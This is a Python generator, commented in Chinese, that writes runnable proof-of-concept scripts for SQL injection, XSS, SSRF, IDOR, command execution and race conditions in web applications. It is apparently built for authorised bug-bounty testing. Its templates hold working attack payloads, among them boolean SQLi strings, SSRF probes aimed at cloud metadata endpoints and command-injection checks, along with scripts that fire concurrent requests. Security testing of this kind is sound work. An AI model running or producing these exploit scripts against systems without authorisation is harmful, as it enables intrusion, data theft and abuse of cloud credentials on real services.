#!/usr/bin/env python3
"""
PoC Generator — 自动生成可运行的 PoC 脚本
参考 VulnClaw 的 poc_builder.py 设计
为每个确认漏洞生成对应的 Python PoC 脚本

核心能力：
1. 根据漏洞类型生成针对性 PoC 模板
2. 填入实际的 URL/参数/payload
3. 生成可直接运行的 Python 脚本
4. 支持 SQLi/XSS/SSRF/IDOR/RCE/LFI 等类型

来源: 参考 VulnClaw report/poc_builder.py
"""

import re
import os
from datetime import datetime
from typing import Optional


# ═══════════════════════════════════════════════════════════════
# PoC 模板
# ═══════════════════════════════════════════════════════════════

POC_TEMPLATES = {
    "sqli": '''#!/usr/bin/env python3
"""
PoC: SQL Injection — {title}
Target: {url}
Parameter: {param}
Generated: {timestamp}
"""
import requests

TARGET = "{url}"
PARAM = "{param}"
PAYLOAD = "{payload}"

# 布尔盲注验证
def test_boolean_sqli():
    """布尔盲注: TRUE/FALSE 条件对比"""
    true_payload = "' AND 1=1-- -"
    false_payload = "' AND 1=2-- -"
    
    r_true = requests.get(TARGET, params={{PARAM: true_payload}}, verify=False)
    r_false = requests.get(TARGET, params={{PARAM: false_payload}}, verify=False)
    
    if len(r_true.text) != len(r_false.text):
        print(f"[+] SQL Injection confirmed!")
        print(f"    TRUE  response length: {{len(r_true.text)}}")
        print(f"    FALSE response length: {{len(r_false.text)}}")
        return True
    print("[-] Not vulnerable (same response)")
    return False

if __name__ == "__main__":
    print(f"[*] Testing SQL Injection on {{TARGET}}")
    test_boolean_sqli()
''',

    "xss": '''#!/usr/bin/env python3
"""
PoC: Cross-Site Scripting (XSS) — {title}
Target: {url}
Parameter: {param}
Generated: {timestamp}
"""
import requests

TARGET = "{url}"
PARAM = "{param}"
PAYLOAD = "{payload}"

def test_xss():
    """检测 payload 是否在响应中未编码反射"""
    r = requests.get(TARGET, params={{PARAM: PAYLOAD}}, verify=False)
    
    if PAYLOAD in r.text:
        print(f"[+] XSS confirmed! Payload reflected without encoding.")
        print(f"    Payload: {{PAYLOAD}}")
        # 检查是否被编码
        encoded = PAYLOAD.replace("<", "&lt;").replace(">", "&gt;")
        if encoded in r.text and PAYLOAD not in r.text:
            print("[-] Actually encoded, not exploitable")
            return False
        return True
    print("[-] Payload not reflected")
    return False

if __name__ == "__main__":
    print(f"[*] Testing XSS on {{TARGET}}")
    test_xss()
''',

    "ssrf": '''#!/usr/bin/env python3
"""
PoC: Server-Side Request Forgery (SSRF) — {title}
Target: {url}
Parameter: {param}
Generated: {timestamp}
"""
import requests

TARGET = "{url}"
PARAM = "{param}"

def test_ssrf():
    """SSRF: 尝试访问内网/云元数据"""
    payloads = [
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
    ]
    
    for payload in payloads:
        r = requests.get(TARGET, params={{PARAM: payload}}, verify=False, timeout=10)
        if r.status_code == 200 and len(r.text) > 0:
            indicators = ["ami-id", "instance-id", "iam", "root:", "html"]
            if any(ind in r.text.lower() for ind in indicators):
                print(f"[+] SSRF confirmed with payload: {{payload}}")
                print(f"    Response preview: {{r.text[:200]}}")
                return True
    print("[-] SSRF not confirmed")
    return False

if __name__ == "__main__":
    print(f"[*] Testing SSRF on {{TARGET}}")
    test_ssrf()
''',

    "idor": '''#!/usr/bin/env python3
"""
PoC: Insecure Direct Object Reference (IDOR) — {title}
Target: {url}
Generated: {timestamp}
"""
import requests

TARGET = "{url}"
TOKEN_A = "Bearer YOUR_TOKEN_A"  # 攻击者
TOKEN_B = "Bearer YOUR_TOKEN_B"  # 受害者

def test_idor():
    """IDOR: 用 A 的 token 访问 B 的资源"""
    headers_a = {{"Authorization": TOKEN_A}}
    
    r = requests.get(TARGET, headers=headers_a, verify=False)
    
    if r.status_code == 200:
        print(f"[+] IDOR: 攻击者可访问此资源 (HTTP {{r.status_code}})")
        print(f"    Response preview: {{r.text[:200]}}")
        return True
    else:
        print(f"[-] Access denied (HTTP {{r.status_code}})")
        return False

if __name__ == "__main__":
    print(f"[*] Testing IDOR on {{TARGET}}")
    test_idor()
''',

    "rce": '''#!/usr/bin/env python3
"""
PoC: Remote Code Execution (RCE) — {title}
Target: {url}
Parameter: {param}
Generated: {timestamp}
⚠️ WARNING: 仅在授权范围内使用！
"""
import requests

TARGET = "{url}"
PARAM = "{param}"

def test_rce():
    """RCE: 命令执行验证（使用无害命令）"""
    # 使用 id/whoami 等无害命令验证
    payloads = [
        ("id", r"uid=\\d+"),
        ("whoami", r"[a-z]+"),
    ]
    
    for cmd, pattern in payloads:
        r = requests.get(TARGET, params={{PARAM: cmd}}, verify=False, timeout=10)
        import re
        if re.search(pattern, r.text):
            print(f"[+] RCE confirmed! Command '{{cmd}}' executed.")
            print(f"    Output: {{r.text[:200]}}")
            return True
    print("[-] RCE not confirmed")
    return False

if __name__ == "__main__":
    print(f"[*] Testing RCE on {{TARGET}}")
    print("⚠️  仅在授权范围内使用！")
    test_rce()
''',

    "race_condition": '''#!/usr/bin/env python3
"""
PoC: Race Condition — {title}
Target: {url}
Generated: {timestamp}
⚠️ WARNING: 并发测试可能影响业务，控制次数！
"""
import requests
import threading
import time

TARGET = "{url}"
COOKIE = "session=YOUR_SESSION_COOKIE"
BODY = {payload}

results = []

def send_request():
    """发送单次请求"""
    try:
        r = requests.post(TARGET, json=BODY, 
                         headers={{"Cookie": COOKIE}}, 
                         verify=False, timeout=10)
        results.append(r.status_code)
    except Exception as e:
        results.append(f"error: {{e}}")

def test_race():
    """并发5次（SRC红线: 不超过5次）"""
    threads = []
    for _ in range(5):
        t = threading.Thread(target=send_request)
        threads.append(t)
    
    # 同时启动
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    success_count = results.count(200)
    print(f"[*] 并发5次, 成功{{success_count}}次")
    if success_count > 1:
        print(f"[+] Race Condition 可能存在! {{success_count}}/5 次成功")
        return True
    return False

if __name__ == "__main__":
    print(f"[*] Testing Race Condition on {{TARGET}}")
    print("⚠️  控制并发次数，不要反复测试！")
    test_race()
''',

    "generic": '''#!/usr/bin/env python3
"""
PoC: {title}
Target: {url}
Type: {vuln_type}
Generated: {timestamp}
"""
import requests

TARGET = "{url}"

def test_vuln():
    """验证漏洞"""
    r = requests.get(TARGET, verify=False, timeout=10)
    print(f"[*] Response: HTTP {{r.status_code}}")
    print(f"[*] Length: {{len(r.text)}}")
    print(f"[*] Preview: {{r.text[:300]}}")

if __name__ == "__main__":
    print(f"[*] Testing on {{TARGET}}")
    test_vuln()
''',
}


# ═══════════════════════════════════════════════════════════════
# PoC Generator
# ═══════════════════════════════════════════════════════════════

class PoCGenerator:
    """
    PoC 自动生成器
    
    用法:
        gen = PoCGenerator(output_dir="./pocs")
        
        poc_path = gen.generate(finding={
            "type": "sqli",
            "url": "https://target.com/api/search?q=test",
            "param": "q",
            "payload": "' OR '1'='1",
            "detail": "布尔盲注确认",
        })
    """

    def __init__(self, output_dir: str = "./pocs"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def generate(self, finding: dict) -> Optional[str]:
        """
        为漏洞发现生成 PoC 脚本
        
        finding: {
            "type": "sqli/xss/ssrf/idor/rce/race_condition/...",
            "url": "https://target.com/...",
            "param": "参数名",
            "payload": "使用的 payload",
            "detail": "漏洞详情",
        }
        
        返回: 生成的 PoC 文件路径
        """
        vuln_type = self._normalize_type(finding.get("type", ""))
        template = POC_TEMPLATES.get(vuln_type, POC_TEMPLATES["generic"])

        # 填充模板
        poc_content = template.format(
            title=finding.get("detail", finding.get("type", "Unknown")),
            url=finding.get("url", "https://TARGET"),
            param=finding.get("param", "PARAM"),
            payload=finding.get("payload", "PAYLOAD"),
            vuln_type=vuln_type,
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        # 生成文件名
        safe_type = re.sub(r'[^a-zA-Z0-9_]', '_', vuln_type)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"poc_{safe_type}_{timestamp}.py"
        filepath = os.path.join(self.output_dir, filename)

        # 写入文件
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(poc_content)

        # 设为可执行
        os.chmod(filepath, 0o755)

        return filepath

    def generate_batch(self, findings: list[dict]) -> list[str]:
        """批量生成 PoC"""
        paths = []
        for finding in findings:
            path = self.generate(finding)
            if path:
                paths.append(path)
        return paths

    def _normalize_type(self, vuln_type: str) -> str:
        """规范化漏洞类型名"""
        type_lower = vuln_type.lower().strip()
        
        type_map = {
            "sql injection": "sqli",
            "sql注入": "sqli",
            "sqli": "sqli",
            "xss": "xss",
            "cross-site scripting": "xss",
            "ssrf": "ssrf",
            "server-side request forgery": "ssrf",
            "idor": "idor",
            "insecure direct object reference": "idor",
            "越权": "idor",
            "水平越权": "idor",
            "rce": "rce",
            "remote code execution": "rce",
            "命令执行": "rce",
            "command injection": "rce",
            "race condition": "race_condition",
            "竞态条件": "race_condition",
            "并发竞态": "race_condition",
            "race condition (并发竞态)": "race_condition",
        }

        return type_map.get(type_lower, "generic")
